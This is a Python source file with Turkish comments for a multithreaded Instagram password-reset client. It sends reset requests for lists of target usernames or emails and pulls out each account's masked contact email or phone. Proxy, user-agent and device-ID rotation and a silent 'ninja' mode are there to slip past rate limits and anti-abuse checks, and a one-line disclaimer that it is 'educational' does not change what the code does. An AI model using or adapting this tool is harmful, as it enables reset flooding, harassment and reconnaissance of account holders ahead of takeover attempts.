import requests
import re
import json
import threading
import time
import os
import random
import logging
from typing import Union, List, Optional, Dict, Any
from itertools import cycle

# User-Agent listesi (çeşitlendirme)
USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 310.0.0.28.108 Android (32/12; 480dpi; 1440x2880; oneplus; IN2015; oneplus9pro; sm8350; en_US; 354367890)",
    "Instagram 300.0.0.15.106 Android (31/11; 560dpi; 1080x2400; google; Pixel 6; oriole; tensor; en_US; 123456789)",
    "Instagram 290.0.0.10.104 Android (30/10; 420dpi; 1080x2160; htc; U12+; htc_ocndugl; snapdragon835; en_US; 789456123)",
    "Instagram 280.0.0.5.101 Android (29/9; 480dpi; 1440x3120; sony; XPERIA_1; SO-03L; snapdragon855; en_US; 456789123)",
]

# Device ID listesi (çeşitlendirme)
DEVICE_IDS = [
    "android-8a1c3f9b5e2d4c7a",
    "android-b2d5e4c8f7a3d9b1",
    "android-c3e6f5d9a8b4c2e0",
    "android-d4f7a6e0b9c5d3f1",
    "android-e5a8b7f1c0d6e4a2",
]

logger = logging.getLogger(__name__)

class InstagramResetClient:
    def __init__(self, threads: int = 6, timeout: int = 12, proxies: Optional[List[str]] = None, use_random_agents: bool = True, request_timeout: int = 5):
        self.threads = max(1, threads)
        self.timeout = timeout  # Overall timeout
        self.request_timeout = request_timeout  # Per-request timeout (daha hızlı fail)
        self.stop_event = threading.Event()
        self.success_lock = threading.Lock()
        self.success_response: Optional[requests.Response] = None
        
        # Proxy yönetimi
        self.proxies = proxies or []
        self.proxy_cycle = cycle(self.proxies) if self.proxies else None
        
        # User-Agent rotation
        self.use_random_agents = use_random_agents
        self.ua_cycle = cycle(USER_AGENTS)
        self.device_id_cycle = cycle(DEVICE_IDS)
        
        # Thread-safe yönetim
        self.sessions: Dict[int, requests.Session] = {}
        self.session_lock = threading.Lock()

    def __enter__(self):
        """Context manager entry"""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - cleanup resources"""
        self.cleanup()
        return False

    def cleanup(self):
        """Tüm session'ları kapat ve kaynakları serbest bırak"""
        with self.session_lock:
            for session in self.sessions.values():
                try:
                    session.close()
                except:
                    pass
            self.sessions.clear()
        logger.info("Tüm session'lar kapatıldı")

    def _get_next_proxy(self) -> Optional[Dict[str, str]]:
        """Döngü halinde bir sonraki proxy'yi döndür"""
        if not self.proxy_cycle:
            return None
        
        proxy_url = next(self.proxy_cycle)
        return {
            "http": proxy_url,
            "https": proxy_url
        }

    def _get_random_agent(self) -> str:
        """Random User-Agent döndür"""
        if self.use_random_agents:
            return random.choice(USER_AGENTS)
        return next(self.ua_cycle)

    def _get_random_device_id(self) -> str:
        """Random Device ID döndür"""
        return next(self.device_id_cycle)

    def _generate_randomized_headers(self) -> Dict[str, str]:
        """Çeşitlendirilmiş header'lar oluştur"""
        user_agent = self._get_random_agent()
        device_id = self._get_random_device_id()
        
        return {
            "User-Agent": user_agent,
            "X-IG-App-ID": random.choice(["567067343352427", "124024574287414", "123456789012345"]),
            "X-IG-Device-ID": device_id,
            "X-IG-Device-Secret": f"android-{os.urandom(8).hex()}",
            "X-IG-Timezone-Offset": str(random.choice([-18000, -14400, -10800, 0, 3600, 5400, 10800])),
            "X-Bloks-Version-Id": "ce555e5500576acd8e84a66018f54a05720f2dce29f0bb5a1f97f0c10d6fac48",
            "X-IG-Connection-Type": random.choice(["WIFI", "MOBILE", "LTE"]),
            "Accept": "*/*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/",
        }

    def _get_session(self, thread_id: Optional[int] = None) -> requests.Session:
        """Her thread için ayrı session oluştur veya mevcut olanı al"""
        thread_id = thread_id or threading.get_ident()
        
        with self.session_lock:
            if thread_id in self.sessions:
                return self.sessions[thread_id]
        
        session = requests.Session()
        
        # Çeşitlendirilmiş header'lar ekle
        session.headers.update(self._generate_randomized_headers())
        
        # Proxy ayarla
        if self.proxies:
            proxy = self._get_next_proxy()
            if proxy:
                session.proxies.update(proxy)
                logger.debug(f"Thread {thread_id} için proxy ayarlandı")
        
        with self.session_lock:
            self.sessions[thread_id] = session
        
        return session

    @staticmethod
    def _extract_csrf(text: str) -> Optional[str]:
        patterns = [
            r'"csrf_token":"(.*?)"',
            r'csrftoken=([a-zA-Z0-9]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def _initialize_csrf(self, session: requests.Session, thread_id: Optional[int] = None) -> bool:
        """Her session için ayrı CSRF token al (optimized)"""
        try:
            # Sadece password reset sayfasından al (daha hızlı)
            r = session.get(
                "https://www.instagram.com/accounts/password/reset/", 
                timeout=self.request_timeout
            )
            csrf = self._extract_csrf(r.text)
            if csrf:
                session.headers["X-CSRFToken"] = csrf
                logger.debug(f"CSRF token başarıyla alındı (Thread {thread_id})")
                return True
            
            # Fallback: Ana sayfadan al
            r = session.get("https://www.instagram.com/", timeout=self.request_timeout)
            csrf = self._extract_csrf(r.text)
            if csrf:
                session.headers["X-CSRFToken"] = csrf
                logger.debug(f"Fallback CSRF token başarıyla alındı (Thread {thread_id})")
                return True
            
            logger.warning(f"CSRF token alınamadı (Thread {thread_id})")
            return False
        except requests.RequestException as e:
            logger.debug(f"CSRF initialization hatası (hızlı timeout): {e}")
            return False
        except Exception as e:
            logger.error(f"Beklenmeyen hata: {e}")
            return False

    def _send_reset(self, session: requests.Session, target: str, thread_id: Optional[int] = None) -> Optional[requests.Response]:
        """Reset isteğini gönder - her session için CSRF unique"""
        if not self._initialize_csrf(session, thread_id):
            logger.warning(f"CSRF initialize edilemedi: {target}")
            return None

        payload = {
            "email_or_username": target,
            "jazoest": "21885",
        }

        try:
            r = session.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data=payload,
                headers={"X-Requested-With": "XMLHttpRequest"},
                timeout=self.request_timeout,  # Daha hızlı timeout
            )

            if r.status_code == 200 and len(r.content) > 100:
                try:
                    data = r.json()
                    if data.get("status") == "ok":
                        with self.success_lock:
                            if self.success_response is None:
                                self.success_response = r
                        self.stop_event.set()
                        logger.info(f"✓ Reset başarılı: {target}")
                        return r
                except json.JSONDecodeError:
                    logger.debug(f"Response JSON parse edilemedi")
            return None
        except requests.Timeout:
            logger.warning(f"Timeout: {target}")
            return None
        except requests.ConnectionError as e:
            logger.warning(f"Connection hatası: {e}")
            return None
        except Exception as e:
            logger.error(f"Beklenmeyen hata: {e}")
            return None

    def _worker(self, target: str):
        """Worker thread - ayrı session ve CSRF ile çalışır (optimized)"""
        thread_id = threading.get_ident()
        session = self._get_session(thread_id)
        attempt = 0
        max_attempts = 4
        backoff_base = 0.5  # İlk bekleme 0.5 saniye

        while attempt < max_attempts and not self.stop_event.is_set():
            attempt += 1
            logger.debug(f"Deneme {attempt}/{max_attempts} - Thread {thread_id}")
            
            if self._send_reset(session, target, thread_id):
                logger.info(f"Thread {thread_id} başarılı oldu")
                return
            
            # Exponential backoff (0.5s, 1s, 2s yerine sabit 1-3s)
            wait_time = backoff_base * (2 ** (attempt - 1))
            wait_time = min(wait_time, 3.0)  # Max 3 saniye
            wait_time += random.uniform(0, 0.5)  # Jitter ekle
            time.sleep(wait_time)

    def _extract_fields(self, data: Dict[str, Any], fields: Union[str, List[str]]) -> Any:
        """
        Extract specified field(s) from response data.
        
        Args:
            data: Response JSON data
            fields: Single field name (str) or list of field names
            
        Returns:
            Single value if one field, dict if multiple fields
        """
        if isinstance(fields, str):
            # Handle comma-separated string
            if "," in fields:
                field_list = [f.strip() for f in fields.split(",")]
                return {f: data.get(f) for f in field_list}
            else:
                # Single field - return just the value
                return data.get(fields)
        elif isinstance(fields, list):
            # List of fields - return dict
            return {f: data.get(f) for f in fields}
        return data

    def _process_response(self, response: Optional[requests.Response], extract: Union[str, List[str], None, bool] = None) -> Any:
        """
        Process response and optionally extract specific fields.
        
        Args:
            response: requests.Response object or None
            extract: None/False for full JSON, str/list for specific fields
            
        Returns:
            Dict with full data or extracted fields, None if failed
        """
        if response is None:
            return None
        
        try:
            data = response.json()
            
            # If extract is None or False, return full JSON
            if extract is None or extract is False:
                return data
            
            # Otherwise extract specific fields
            return self._extract_fields(data, extract)
        except:
            return None

    def send_reset_request(self, target: str, extract: Union[str, List[str], None, bool] = None, delay_before: float = 0, ninja: bool = False) -> Any:
        """
        Send Instagram password reset request for a single target.
        
        Args:
            target: Username or email to target
            extract: None/False for full JSON response (default), 
                    str for single field ("contact_point"),
                    str list for multiple fields (["contact_point", "status"]),
                    comma-separated string ("field1,field2,field3")
            delay_before: Delay in seconds before sending request
            ninja: Silent mode - ekrana yazı yazdırılmaz (default: False)
            
        Returns:
            Full response dict, extracted fields, or None if failed
            In ninja mode: Returns value or False (never prints)
            In normal mode: Prints result and returns value or None
            
        Examples:
            # With proxies and multiple threads
            client = InstagramResetClient(
                threads=6,
                proxies=["http://proxy1:8080", "http://proxy2:8080"],
                use_random_agents=True
            )
            
            # Full JSON
            response = client.send_reset_request("username")
            
            # Ninja Mode - Silent
            email = client.send_reset_request("username", ninja=True, extract="contact_point")
            # Döndürür: "user@example.com" veya False
            
            # Single field as string
            email = client.send_reset_request("username", extract="contact_point")
            
            # Multiple fields
            result = client.send_reset_request("username", extract=["contact_point", "status"])
        """
        if delay_before > 0:
            time.sleep(delay_before)
        
        if not ninja:
            logger.info(f"Hedef: {target}")
            print(f"Hedef: {target}")
        
        self.success_response = None
        self.stop_event.clear()

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker, args=(target,), daemon=True, name=f"IGReset-{i}")
            threads.append(t)
            t.start()
            if not ninja:
                logger.debug(f"Thread {i} başlatıldı")
            # Kısa delay thread'ler arasında (simultaneous connection riskini azalt)
            time.sleep(0.05)

        try:
            for t in threads:
                t.join(timeout=30)
        except KeyboardInterrupt:
            logger.warning("Keyboard interrupt alındı")
            self.stop_event.set()
            return False if ninja else None

        result = self._process_response(self.success_response, extract)
        
        if not ninja:
            if result is not None:
                logger.info("✓ Başarılı! Reset isteği gönderildi.")
                print("✓ Başarılı! Reset isteği gönderildi.")
            else:
                logger.warning("✗ Başarısız / yakalanmadı.")
                print("✗ Başarısız / yakalanmadı.")
        else:
            # Ninja mode: return value or False
            if result is not None:
                logger.info(f"✓ Başarılı (ninja): {target}")
                return result
            else:
                logger.warning(f"✗ Başarısız (ninja): {target}")
                return False
        
        return result

    def send_reset_requests(self, targets: List[str], extract: Union[str, List[str], None, bool] = None, delay_between: float = 5.0, verbose: bool = True, ninja: bool = False) -> Dict[str, Any]:
        """
        Send Instagram password reset requests for multiple targets.
        
        Args:
            targets: List of usernames or emails
            extract: Same as send_reset_request
            delay_between: Delay in seconds between targets
            verbose: Print progress messages
            ninja: Silent mode - ekrana yazı yazdırılmaz
            
        Returns:
            Dict mapping target -> response/extracted_value or False (ninja mode)
            
        Examples:
            # Get contact points for multiple targets
            results = client.send_reset_requests(
                ["user1", "user2", "user3"],
                extract="contact_point"
            )
            print(results)  # {"user1": "s***8@gmail.com", "user2": None, ...}
            
            # Ninja Mode - Silent
            results = client.send_reset_requests(
                ["user1", "user2"],
                ninja=True,
                extract="contact_point"
            )
            # {"user1": "email@example.com", "user2": False}
        """
        if verbose and not ninja:
            print("UYARI: Bu araç Instagram kullanım şartlarına aykırı olabilir. Sadece eğitim/araştırma için kullanın.\n")
            logger.warning("Multiple targets işlemi başlatıldı")
        
        results = {}
        for i, target in enumerate(targets, 1):
            if verbose and not ninja:
                print(f"\n[{i}/{len(targets)}] ", end="")
            
            logger.info(f"Hedef {i}/{len(targets)}: {target}")
            result = self.send_reset_request(target, extract=extract, delay_before=0, ninja=ninja)
            results[target] = result
            
            if i < len(targets) and delay_between > 0:
                if verbose and not ninja:
                    print(f"Bekleniyor {delay_between:.1f}s...")
                time.sleep(delay_between)
        
        success_count = sum(1 for v in results.values() if v is not False and v is not None)
        if verbose and not ninja:
            print(f"\n\nSonuçlar: {success_count}/{len(targets)} başarılı")
        
        logger.info(f"Batch işlemi tamamlandı: {success_count}/{len(targets)} başarılı")
        
        return results